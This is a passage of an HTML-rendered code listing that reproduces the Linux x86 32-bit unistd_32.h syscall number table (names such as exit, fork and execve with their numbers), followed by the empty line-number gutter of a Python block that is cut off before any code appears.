class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#32位</span></span><br><span class="line"><span class="comment">#ifndef _ASM_X86_UNISTD_32_H</span></span><br><span class="line"><span class="comment">#define _ASM_X86_UNISTD_32_H 1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define __NR_restart_syscall 0</span></span><br><span class="line"><span class="comment">#define __NR_exit 1</span></span><br><span class="line"><span class="comment">#define __NR_fork 2</span></span><br><span class="line"><span class="comment">#define __NR_read 3</span></span><br><span class="line"><span class="comment">#define __NR_write 4</span></span><br><span class="line"><span class="comment">#define __NR_open 5</span></span><br><span class="line"><span class="comment">#define __NR_close 6</span></span><br><span class="line"><span class="comment">#define __NR_waitpid 7</span></span><br><span class="line"><span class="comment">#define __NR_creat 8</span></span><br><span class="line"><span class="comment">#define __NR_link 9</span></span><br><span class="line"><span class="comment">#define __NR_unlink 10</span></span><br><span class="line"><span class="comment">#define __NR_execve 11</span></span><br><span class="line"><span class="comment">#define __NR_chdir 12</span></span><br><span class="line"><span class="comment">#define __NR_time 13</span></span><br><span class="line"><span class="comment">#define __NR_mknod 14</span></span><br><span class="line"><span class="comment">#define __NR_chmod 15</span></span><br><span class="line"><span class="comment">#define __NR_lchown 16</span></span><br><span class="line"><span class="comment">#define __NR_break 17</span></span><br><span class="line"><span class="comment">#define __NR_oldstat 18</span></span><br><span class="line"><span class="comment">#define __NR_lseek 19</span></span><br><span class="line"><span class="comment">#define __NR_getpid 20</span></span><br><span class="line"><span class="comment">#define __NR_mount 21</span></span><br><span class="line"><span class="comment">#define __NR_umount 22</span></span><br><span class="line"><span class="comment">#define __NR_setuid 23</span></span><br><span class="line"><span class="comment">#define __NR_getuid 24</span></span><br><span class="line"><span class="comment">#define __NR_stime 25</span></span><br><span class="line"><span class="comment">#define __NR_ptrace 26</span></span><br><span class="line"><span class="comment">#define __NR_alarm 27</span></span><br><span class="line"><span class="comment">#define __NR_oldfstat 28</span></span><br><span class="line"><span class="comment">#define __NR_pause 29</span></span><br><span class="line"><span class="comment">#define __NR_utime 30</span></span><br><span class="line"><span class="comment">#define __NR_stty 31</span></span><br><span class="line"><span class="comment">#define __NR_gtty 32</span></span><br><span class="line"><span class="comment">#define __NR_access 33</span></span><br><span class="line"><span class="comment">#define __NR_nice 34</span></span><br><span class="line"><span class="comment">#define __NR_ftime 35</span></span><br><span class="line"><span class="comment">#define __NR_sync 36</span></span><br><span class="line"><span class="comment">#define __NR_kill 37</span></span><br><span class="line"><span class="comment">#define __NR_rename 38</span></span><br><span class="line"><span class="comment">#define __NR_mkdir 39</span></span><br><span class="line"><span class="comment">#define __NR_rmdir 40</span></span><br><span class="line"><span class="comment">#define __NR_dup 41</span></span><br><span class="line"><span class="comment">#define __NR_pipe 42</span></span><br><span class="line"><span class="comment">#define __NR_times 43</span></span><br><span class="line"><span class="comment">#define __NR_prof 44</span></span><br><span class="line"><span class="comment">#define __NR_brk 45</span></span><br><span class="line"><span class="comment">#define __NR_setgid 46</span></span><br><span class="line"><span class="comment">#define __NR_getgid 47</span></span><br><span class="line"><span class="comment">#define __NR_signal 48</span></span><br><span class="line"><span class="comment">#define __NR_geteuid 49</span></span><br><span class="line"><span class="comment">#define __NR_getegid 50</span></span><br><span class="line"><span class="comment">#define __NR_acct 51</span></span><br><span class="line"><span class="comment">#define __NR_umount2 52</span></span><br><span class="line"><span class="comment">#define __NR_lock 53</span></span><br><span class="line"><span class="comment">#define __NR_ioctl 54</span></span><br><span class="line"><span class="comment">#define __NR_fcntl 55</span></span><br><span class="line"><span class="comment">#define __NR_mpx 56</span></span><br><span class="line"><span class="comment">#define __NR_setpgid 57</span></span><br><span class="line"><span class="comment">#define __NR_ulimit 58</span></span><br><span class="line"><span class="comment">#define __NR_oldolduname 59</span></span><br><span class="line"><span class="comment">#define __NR_umask 60</span></span><br><span class="line"><span class="comment">#define __NR_chroot 61</span></span><br><span class="line"><span class="comment">#define __NR_ustat 62</span></span><br><span class="line"><span class="comment">#define __NR_dup2 63</span></span><br><span class="line"><span class="comment">#define __NR_getppid 64</span></span><br><span class="line"><span class="comment">#define __NR_getpgrp 65</span></span><br><span class="line"><span class="comment">#define __NR_setsid 66</span></span><br><span class="line"><span class="comment">#define __NR_sigaction 67</span></span><br><span class="line"><span class="comment">#define __NR_sgetmask 68</span></span><br><span class="line"><span class="comment">#define __NR_ssetmask 69</span></span><br><span class="line"><span class="comment">#define __NR_setreuid 70</span></span><br><span class="line"><span class="comment">#define __NR_setregid 71</span></span><br><span class="line"><span class="comment">#define __NR_sigsuspend 72</span></span><br><span class="line"><span class="comment">#define __NR_sigpending 73</span></span><br><span class="line"><span class="comment">#define __NR_sethostname 74</span></span><br><span class="line"><span class="comment">#define __NR_setrlimit 75</span></span><br><span class="line"><span class="comment">#define __NR_getrlimit 76</span></span><br><span class="line"><span class="comment">#define __NR_getrusage 77</span></span><br><span class="line"><span class="comment">#define __NR_gettimeofday 78</span></span><br><span class="line"><span class="comment">#define __NR_settimeofday 79</span></span><br><span class="line"><span class="comment">#define __NR_getgroups 80</span></span><br><span class="line"><span class="comment">#define __NR_setgroups 81</span></span><br><span class="line"><span class="comment">#define __NR_select 82</span></span><br><span class="line"><span class="comment">#define __NR_symlink 83</span></span><br><span class="line"><span class="comment">#define __NR_oldlstat 84</span></span><br><span class="line"><span class="comment">#define __NR_readlink 85</span></span><br><span class="line"><span class="comment">#define __NR_uselib 86</span></span><br><span class="line"><span class="comment">#define __NR_swapon 87</span></span><br><span class="line"><span class="comment">#define __NR_reboot 88</span></span><br><span class="line"><span class="comment">#define __NR_readdir 89</span></span><br><span class="line"><span class="comment">#define __NR_mmap 90</span></span><br><span class="line"><span class="comment">#define __NR_munmap 91</span></span><br><span class="line"><span class="comment">#define __NR_truncate 92</span></span><br><span class="line"><span class="comment">#define __NR_ftruncate 93</span></span><br><span class="line"><span class="comment">#define __NR_fchmod 94</span></span><br><span class="line"><span class="comment">#define __NR_fchown 95</span></span><br><span class="line"><span class="comment">#define __NR_getpriority 96</span></span><br><span class="line"><span class="comment">#define __NR_setpriority 97</span></span><br><span class="line"><span class="comment">#define __NR_profil 98</span></span><br><span class="line"><span class="comment">#define __NR_statfs 99</span></span><br><span class="line"><span class="comment">#define __NR_fstatfs 100</span></span><br><span class="line"><span class="comment">#define __NR_ioperm 101</span></span><br><span class="line"><span class="comment">#define __NR_socketcall 102</span></span><br><span class="line"><span class="comment">#define __NR_syslog 103</span></span><br><span class="line"><span class="comment">#define __NR_setitimer 104</span></span><br><span class="line"><span class="comment">#define __NR_getitimer 105</span></span><br><span class="line"><span class="comment">#define __NR_stat 106</span></span><br><span class="line"><span class="comment">#define __NR_lstat 107</span></span><br><span class="line"><span class="comment">#define __NR_fstat 108</span></span><br><span class="line"><span class="comment">#define __NR_olduname 109</span></span><br><span class="line"><span class="comment">#define __NR_iopl 110</span></span><br><span class="line"><span class="comment">#define __NR_vhangup 111</span></span><br><span class="line"><span class="comment">#define __NR_idle 112</span></span><br><span class="line"><span class="comment">#define __NR_vm86old 113</span></span><br><span class="line"><span class="comment">#define __NR_wait4 114</span></span><br><span class="line"><span class="comment">#define __NR_swapoff 115</span></span><br><span class="line"><span class="comment">#define __NR_sysinfo 116</span></span><br><span class="line"><span class="comment">#define __NR_ipc 117</span></span><br><span class="line"><span class="comment">#define __NR_fsync 118</span></span><br><span class="line"><span class="comment">#define __NR_sigreturn 119</span></span><br><span class="line"><span class="comment">#define __NR_clone 120</span></span><br><span class="line"><span class="comment">#define __NR_setdomainname 121</span></span><br><span class="line"><span class="comment">#define __NR_uname 122</span></span><br><span class="line"><span class="comment">#define __NR_modify_ldt 123</span></span><br><span class="line"><span class="comment">#define __NR_adjtimex 124</span></span><br><span class="line"><span class="comment">#define __NR_mprotect 125</span></span><br><span class="line"><span class="comment">#define __NR_sigprocmask 126</span></span><br><span class="line"><span class="comment">#define __NR_create_module 127</span></span><br><span class="line"><span class="comment">#define __NR_init_module 128</span></span><br><span class="line"><span class="comment">#define __NR_delete_module 129</span></span><br><span class="line"><span class="comment">#define __NR_get_kernel_syms 130</span></span><br><span class="line"><span class="comment">#define __NR_quotactl 131</span></span><br><span class="line"><span class="comment">#define __NR_getpgid 132</span></span><br><span class="line"><span class="comment">#define __NR_fchdir 133</span></span><br><span class="line"><span class="comment">#define __NR_bdflush 134</span></span><br><span class="line"><span class="comment">#define __NR_sysfs 135</span></span><br><span class="line"><span class="comment">#define __NR_personality 136</span></span><br><span class="line"><span class="comment">#define __NR_afs_syscall 137</span></span><br><span class="line"><span class="comment">#define __NR_setfsuid 138</span></span><br><span class="line"><span class="comment">#define __NR_setfsgid 139</span></span><br><span class="line"><span class="comment">#define __NR__llseek 140</span></span><br><span class="line"><span class="comment">#define __NR_getdents 141</span></span><br><span class="line"><span class="comment">#define __NR__newselect 142</span></span><br><span class="line"><span class="comment">#define __NR_flock 143</span></span><br><span class="line"><span class="comment">#define __NR_msync 144</span></span><br><span class="line"><span class="comment">#define __NR_readv 145</span></span><br><span class="line"><span class="comment">#define __NR_writev 146</span></span><br><span class="line"><span class="comment">#define __NR_getsid 147</span></span><br><span class="line"><span class="comment">#define __NR_fdatasync 148</span></span><br><span class="line"><span class="comment">#define __NR__sysctl 149</span></span><br><span class="line"><span class="comment">#define __NR_mlock 150</span></span><br><span class="line"><span class="comment">#define __NR_munlock 151</span></span><br><span class="line"><span class="comment">#define __NR_mlockall 152</span></span><br><span class="line"><span class="comment">#define __NR_munlockall 153</span></span><br><span class="line"><span class="comment">#define __NR_sched_setparam 154</span></span><br><span class="line"><span class="comment">#define __NR_sched_getparam 155</span></span><br><span class="line"><span class="comment">#define __NR_sched_setscheduler 156</span></span><br><span class="line"><span class="comment">#define __NR_sched_getscheduler 157</span></span><br><span class="line"><span class="comment">#define __NR_sched_yield 158</span></span><br><span class="line"><span class="comment">#define __NR_sched_get_priority_max 159</span></span><br><span class="line"><span class="comment">#define __NR_sched_get_priority_min 160</span></span><br><span class="line"><span class="comment">#define __NR_sched_rr_get_interval 161</span></span><br><span class="line"><span class="comment">#define __NR_nanosleep 162</span></span><br><span class="line"><span class="comment">#define __NR_mremap 163</span></span><br><span class="line"><span class="comment">#define __NR_setresuid 164</span></span><br><span class="line"><span class="comment">#define __NR_getresuid 165</span></span><br><span class="line"><span class="comment">#define __NR_vm86 166</span></span><br><span class="line"><span class="comment">#define __NR_query_module 167</span></span><br><span class="line"><span class="comment">#define __NR_poll 168</span></span><br><span class="line"><span class="comment">#define __NR_nfsservctl 169</span></span><br><span class="line"><span class="comment">#define __NR_setresgid 170</span></span><br><span class="line"><span class="comment">#define __NR_getresgid 171</span></span><br><span class="line"><span class="comment">#define __NR_prctl 172</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigreturn 173</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigaction 174</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigprocmask 175</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigpending 176</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigtimedwait 177</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigqueueinfo 178</span></span><br><span class="line"><span class="comment">#define __NR_rt_sigsuspend 179</span></span><br><span class="line"><span class="comment">#define __NR_pread64 180</span></span><br><span class="line"><span class="comment">#define __NR_pwrite64 181</span></span><br><span class="line"><span class="comment">#define __NR_chown 182</span></span><br><span class="line"><span class="comment">#define __NR_getcwd 183</span></span><br><span class="line"><span class="comment">#define __NR_capget 184</span></span><br><span class="line"><span class="comment">#define __NR_capset 185</span></span><br><span class="line"><span class="comment">#define __NR_sigaltstack 186</span></span><br><span class="line"><span class="comment">#define __NR_sendfile 187</span></span><br><span class="line"><span class="comment">#define __NR_getpmsg 188</span></span><br><span class="line"><span class="comment">#define __NR_putpmsg 189</span></span><br><span class="line"><span class="comment">#define __NR_vfork 190</span></span><br><span class="line"><span class="comment">#define __NR_ugetrlimit 191</span></span><br><span class="line"><span class="comment">#define __NR_mmap2 192</span></span><br><span class="line"><span class="comment">#define __NR_truncate64 193</span></span><br><span class="line"><span class="comment">#define __NR_ftruncate64 194</span></span><br><span class="line"><span class="comment">#define __NR_stat64 195</span></span><br><span class="line"><span class="comment">#define __NR_lstat64 196</span></span><br><span class="line"><span class="comment">#define __NR_fstat64 197</span></span><br><span class="line"><span class="comment">#define __NR_lchown32 198</span></span><br><span class="line"><span class="comment">#define __NR_getuid32 199</span></span><br><span class="line"><span class="comment">#define __NR_getgid32 200</span></span><br><span class="line"><span class="comment">#define __NR_geteuid32 201</span></span><br><span class="line"><span class="comment">#define __NR_getegid32 202</span></span><br><span class="line"><span class="comment">#define __NR_setreuid32 203</span></span><br><span class="line"><span class="comment">#define __NR_setregid32 204</span></span><br><span class="line"><span class="comment">#define __NR_getgroups32 205</span></span><br><span class="line"><span class="comment">#define __NR_setgroups32 206</span></span><br><span class="line"><span class="comment">#define __NR_fchown32 207</span></span><br><span class="line"><span class="comment">#define __NR_setresuid32 208</span></span><br><span class="line"><span class="comment">#define __NR_getresuid32 209</span></span><br><span class="line"><span class="comment">#define __NR_setresgid32 210</span></span><br><span class="line"><span class="comment">#define __NR_getresgid32 211</span></span><br><span class="line"><span class="comment">#define __NR_chown32 212</span></span><br><span class="line"><span class="comment">#define __NR_setuid32 213</span></span><br><span class="line"><span class="comment">#define __NR_setgid32 214</span></span><br><span class="line"><span class="comment">#define __NR_setfsuid32 215</span></span><br><span class="line"><span class="comment">#define __NR_setfsgid32 216</span></span><br><span class="line"><span class="comment">#define __NR_pivot_root 217</span></span><br><span class="line"><span class="comment">#define __NR_mincore 218</span></span><br><span class="line"><span class="comment">#define __NR_madvise 219</span></span><br><span class="line"><span class="comment">#define __NR_getdents64 220</span></span><br><span class="line"><span class="comment">#define __NR_fcntl64 221</span></span><br><span class="line"><span class="comment">#define __NR_gettid 224</span></span><br><span class="line"><span class="comment">#define __NR_readahead 225</span></span><br><span class="line"><span class="comment">#define __NR_setxattr 226</span></span><br><span class="line"><span class="comment">#define __NR_lsetxattr 227</span></span><br><span class="line"><span class="comment">#define __NR_fsetxattr 228</span></span><br><span class="line"><span class="comment">#define __NR_getxattr 229</span></span><br><span class="line"><span class="comment">#define __NR_lgetxattr 230</span></span><br><span class="line"><span class="comment">#define __NR_fgetxattr 231</span></span><br><span class="line"><span class="comment">#define __NR_listxattr 232</span></span><br><span class="line"><span class="comment">#define __NR_llistxattr 233</span></span><br><span class="line"><span class="comment">#define __NR_flistxattr 234</span></span><br><span class="line"><span class="comment">#define __NR_removexattr 235</span></span><br><span class="line"><span class="comment">#define __NR_lremovexattr 236</span></span><br><span class="line"><span class="comment">#define __NR_fremovexattr 237</span></span><br><span class="line"><span class="comment">#define __NR_tkill 238</span></span><br><span class="line"><span class="comment">#define __NR_sendfile64 239</span></span><br><span class="line"><span class="comment">#define __NR_futex 240</span></span><br><span class="line"><span class="comment">#define __NR_sched_setaffinity 241</span></span><br><span class="line"><span class="comment">#define __NR_sched_getaffinity 242</span></span><br><span class="line"><span class="comment">#define __NR_set_thread_area 243</span></span><br><span class="line"><span class="comment">#define __NR_get_thread_area 244</span></span><br><span class="line"><span class="comment">#define __NR_io_setup 245</span></span><br><span class="line"><span class="comment">#define __NR_io_destroy 246</span></span><br><span class="line"><span class="comment">#define __NR_io_getevents 247</span></span><br><span class="line"><span class="comment">#define __NR_io_submit 248</span></span><br><span class="line"><span class="comment">#define __NR_io_cancel 249</span></span><br><span class="line"><span class="comment">#define __NR_fadvise64 250</span></span><br><span class="line"><span class="comment">#define __NR_exit_group 252</span></span><br><span class="line"><span class="comment">#define __NR_lookup_dcookie 253</span></span><br><span class="line"><span class="comment">#define __NR_epoll_create 254</span></span><br><span class="line"><span class="comment">#define __NR_epoll_ctl 255</span></span><br><span class="line"><span class="comment">#define __NR_epoll_wait 256</span></span><br><span class="line"><span class="comment">#define __NR_remap_file_pages 257</span></span><br><span class="line"><span class="comment">#define __NR_set_tid_address 258</span></span><br><span class="line"><span class="comment">#define __NR_timer_create 259</span></span><br><span class="line"><span class="comment">#define __NR_timer_settime 260</span></span><br><span class="line"><span class="comment">#define __NR_timer_gettime 261</span></span><br><span class="line"><span class="comment">#define __NR_timer_getoverrun 262</span></span><br><span class="line"><span class="comment">#define __NR_timer_delete 263</span></span><br><span class="line"><span class="comment">#define __NR_clock_settime 264</span></span><br><span class="line"><span class="comment">#define __NR_clock_gettime 265</span></span><br><span class="line"><span class="comment">#define __NR_clock_getres 266</span></span><br><span class="line"><span class="comment">#define __NR_clock_nanosleep 267</span></span><br><span class="line"><span class="comment">#define __NR_statfs64 268</span></span><br><span class="line"><span class="comment">#define __NR_fstatfs64 269</span></span><br><span class="line"><span class="comment">#define __NR_tgkill 270</span></span><br><span class="line"><span class="comment">#define __NR_utimes 271</span></span><br><span class="line"><span class="comment">#define __NR_fadvise64_64 272</span></span><br><span class="line"><span class="comment">#define __NR_vserver 273</span></span><br><span class="line"><span class="comment">#define __NR_mbind 274</span></span><br><span class="line"><span class="comment">#define __NR_get_mempolicy 275</span></span><br><span class="line"><span class="comment">#define __NR_set_mempolicy 276</span></span><br><span class="line"><span class="comment">#define __NR_mq_open 277</span></span><br><span class="line"><span class="comment">#define __NR_mq_unlink 278</span></span><br><span class="line"><span class="comment">#define __NR_mq_timedsend 279</span></span><br><span class="line"><span class="comment">#define __NR_mq_timedreceive 280</span></span><br><span class="line"><span class="comment">#define __NR_mq_notify 281</span></span><br><span class="line"><span class="comment">#define __NR_mq_getsetattr 282</span></span><br><span class="line"><span class="comment">#define __NR_kexec_load 283</span></span><br><span class="line"><span class="comment">#define __NR_waitid 284</span></span><br><span class="line"><span class="comment">#define __NR_add_key 286</span></span><br><span class="line"><span class="comment">#define __NR_request_key 287</span></span><br><span class="line"><span class="comment">#define __NR_keyctl 288</span></span><br><span class="line"><span class="comment">#define __NR_ioprio_set 289</span></span><br><span class="line"><span class="comment">#define __NR_ioprio_get 290</span></span><br><span class="line"><span class="comment">#define __NR_inotify_init 291</span></span><br><span class="line"><span class="comment">#define __NR_inotify_add_watch 292</span></span><br><span class="line"><span class="comment">#define __NR_inotify_rm_watch 293</span></span><br><span class="line"><span class="comment">#define __NR_migrate_pages 294</span></span><br><span class="line"><span class="comment">#define __NR_openat 295</span></span><br><span class="line"><span class="comment">#define __NR_mkdirat 296</span></span><br><span class="line"><span class="comment">#define __NR_mknodat 297</span></span><br><span class="line"><span class="comment">#define __NR_fchownat 298</span></span><br><span class="line"><span class="comment">#define __NR_futimesat 299</span></span><br><span class="line"><span class="comment">#define __NR_fstatat64 300</span></span><br><span class="line"><span class="comment">#define __NR_unlinkat 301</span></span><br><span class="line"><span class="comment">#define __NR_renameat 302</span></span><br><span class="line"><span class="comment">#define __NR_linkat 303</span></span><br><span class="line"><span class="comment">#define __NR_symlinkat 304</span></span><br><span class="line"><span class="comment">#define __NR_readlinkat 305</span></span><br><span class="line"><span class="comment">#define __NR_fchmodat 306</span></span><br><span class="line"><span class="comment">#define __NR_faccessat 307</span></span><br><span class="line"><span class="comment">#define __NR_pselect6 308</span></span><br><span class="line"><span class="comment">#define __NR_ppoll 309</span></span><br><span class="line"><span class="comment">#define __NR_unshare 310</span></span><br><span class="line"><span class="comment">#define __NR_set_robust_list 311</span></span><br><span class="line"><span class="comment">#define __NR_get_robust_list 312</span></span><br><span class="line"><span class="comment">#define __NR_splice 313</span></span><br><span class="line"><span class="comment">#define __NR_sync_file_range 314</span></span><br><span class="line"><span class="comment">#define __NR_tee 315</span></span><br><span class="line"><span class="comment">#define __NR_vmsplice 316</span></span><br><span class="line"><span class="comment">#define __NR_move_pages 317</span></span><br><span class="line"><span class="comment">#define __NR_getcpu 318</span></span><br><span class="line"><span class="comment">#define __NR_epoll_pwait 319</span></span><br><span class="line"><span class="comment">#define __NR_utimensat 320</span></span><br><span class="line"><span class="comment">#define __NR_signalfd 321</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_create 322</span></span><br><span class="line"><span class="comment">#define __NR_eventfd 323</span></span><br><span class="line"><span class="comment">#define __NR_fallocate 324</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_settime 325</span></span><br><span class="line"><span class="comment">#define __NR_timerfd_gettime 326</span></span><br><span class="line"><span class="comment">#define __NR_signalfd4 327</span></span><br><span class="line"><span class="comment">#define __NR_eventfd2 328</span></span><br><span class="line"><span class="comment">#define __NR_epoll_create1 329</span></span><br><span class="line"><span class="comment">#define __NR_dup3 330</span></span><br><span class="line"><span class="comment">#define __NR_pipe2 331</span></span><br><span class="line"><span class="comment">#define __NR_inotify_init1 332</span></span><br><span class="line"><span class="comment">#define __NR_preadv 333</span></span><br><span class="line"><span class="comment">#define __NR_pwritev 334</span></span><br><span class="line"><span class="comment">#define __NR_rt_tgsigqueueinfo 335</span></span><br><span class="line"><span class="comment">#define __NR_perf_event_open 336</span></span><br><span class="line"><span class="comment">#define __NR_recvmmsg 337</span></span><br><span class="line"><span class="comment">#define __NR_fanotify_init 338</span></span><br><span class="line"><span class="comment">#define __NR_fanotify_mark 339</span></span><br><span class="line"><span class="comment">#define __NR_prlimit64 340</span></span><br><span class="line"><span class="comment">#define __NR_name_to_handle_at 341</span></span><br><span class="line"><span class="comment">#define __NR_open_by_handle_at 342</span></span><br><span class="line"><span class="comment">#define __NR_clock_adjtime 343</span></span><br><span class="line"><span class="comment">#define __NR_syncfs 344</span></span><br><span class="line"><span class="comment">#define __NR_sendmmsg 345</span></span><br><span class="line"><span class="comment">#define __NR_setns 346</span></span><br><span class="line"><span class="comment">#define __NR_process_vm_readv 347</span></span><br><span class="line"><span class="comment">#define __NR_process_vm_writev 348</span></span><br><span class="line"><span class="comment">#define __NR_kcmp 349</span></span><br><span class="line"><span class="comment">#define __NR_finit_module 350</span></span><br><span class="line"><span class="comment">#define __NR_sched_setattr 351</span></span><br><span class="line"><span class="comment">#define __NR_sched_getattr 352</span></span><br><span class="line"><span class="comment">#define __NR_renameat2 353</span></span><br><span class="line"><span class="comment">#define __NR_seccomp 354</span></span><br><span class="line"><span class="comment">#define __NR_getrandom 355</span></span><br><span class="line"><span class="comment">#define __NR_memfd_create 356</span></span><br><span class="line"><span class="comment">#define __NR_bpf 357</span></span><br><span class="line"><span class="comment">#define __NR_execveat 358</span></span><br><span class="line"><span class="comment">#define __NR_socket 359</span></span><br><span class="line"><span class="comment">#define __NR_socketpair 360</span></span><br><span class="line"><span class="comment">#define __NR_bind 361</span></span><br><span class="line"><span class="comment">#define __NR_connect 362</span></span><br><span class="line"><span class="comment">#define __NR_listen 363</span></span><br><span class="line"><span class="comment">#define __NR_accept4 364</span></span><br><span class="line"><span class="comment">#define __NR_getsockopt 365</span></span><br><span class="line"><span class="comment">#define __NR_setsockopt 366</span></span><br><span class="line"><span class="comment">#define __NR_getsockname 367</span></span><br><span class="line"><span class="comment">#define __NR_getpeername 368</span></span><br><span class="line"><span class="comment">#define __NR_sendto 369</span></span><br><span class="line"><span class="comment">#define __NR_sendmsg 370</span></span><br><span class="line"><span class="comment">#define __NR_recvfrom 371</span></span><br><span class="line"><span class="comment">#define __NR_recvmsg 372</span></span><br><span class="line"><span class="comment">#define __NR_shutdown 373</span></span><br><span class="line"><span class="comment">#define __NR_userfaultfd 374</span></span><br><span class="line"><span class="comment">#define __NR_membarrier 375</span></span><br><span class="line"><span class="comment">#define __NR_mlock2 376</span></span><br><span class="line"><span class="comment">#define __NR_copy_file_range 377</span></span><br><span class="line"><span class="comment">#define __NR_preadv2 378</span></span><br><span class="line"><span class="comment">#define __NR_pwritev2 379</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#endif /* _ASM_X86_UNISTD_32_H */</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span 